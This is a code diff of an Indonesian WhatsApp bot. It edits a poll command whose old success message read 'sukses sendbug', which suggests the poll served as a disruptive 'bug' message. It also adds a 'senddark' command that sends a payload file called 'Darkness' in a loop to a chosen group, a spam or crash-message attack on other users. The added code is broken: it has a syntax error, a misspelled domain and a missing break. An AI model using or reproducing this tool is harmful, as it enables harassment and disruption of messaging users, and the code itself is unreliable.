@@ -605,19 +605,19 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 VOTE LAH",
+"name": "Halo Guys",
 "options": [
 	{
-"optionName": "KATANYA WA KEBAL"
+"optionName": "Biar APA?"
 	},
 	{
-"optionName": "BERANI VOTE GA"
+"optionName": "Biarin Haha"
 	},
 	{
-"optionName": "VOTE LAH SEMUA"
+"optionName": "Vote Lah"
 	},
 	{
-"optionName": "KATANYA KEBAL"
+"optionName": "Hayoooo"
 	},
 	{
 "optionName": "TAKUTT ?"
@@ -627,7 +627,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 	}
 }), { userJid: m.chat, quoted: doc })
 Hafizz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
-deploy('sukses sendbug')
+deploy('sukses Polling')
 }
 break
 case 'votelah': {
@@ -797,6 +797,16 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 Hafizz.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
+case 'senddark': {
+	if (!isCreator) return
+	if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+var nomerwa = q.split('|')[0]
+var jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+anjay(`Baiklah Tuan`)
+darkness = fs.readFileSync('./baseikal/Darkness 㐅')
+Hafizz.sendMessage(`${nomerwa}@s.whatwapp.net`, document.message, { messageId: darkness}, quoted: doc)
+}
 case 'duc': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
